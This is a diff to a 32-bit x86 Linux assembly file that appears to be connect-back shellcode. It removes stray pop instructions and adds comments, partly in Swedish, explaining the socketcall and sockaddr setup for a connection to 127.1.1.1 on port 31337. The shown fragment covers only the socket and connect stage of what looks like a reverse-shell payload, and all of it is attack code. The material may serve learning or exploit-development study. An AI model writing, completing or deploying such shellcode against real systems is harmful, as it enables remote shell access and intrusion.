@@ -16,21 +16,17 @@ _start:
     mov ecx,esp
     int 0x80
     mov edx,eax
-    pop eax
-    pop eax
-    pop eax
-    ;pop eax
     xor eax,eax
     push eax
-    mov al,0x66
-    push 0x0101017f ;  ip
-    push word 0x697a     ; 31337 port
-    push word 0x2        ; sin_family_
+    mov al,0x66         ; socketcall()
+    push 0x0101017f     ;  ip address   - detta är struct
+    push word 0x697a     ; 31337 port   - detta är struct
+    push word 0x2        ; sin_family_  - detta är struct
     mov ecx,esp
-    push 0x10
+    push 0x10           ; detta är storleken - 16
     push ecx
-    push edx
-    mov ecx,esp
+    push edx            ; FD from socket() byte
+    mov ecx,esp         
 
     xor ebx,ebx
     mov bl,0x3
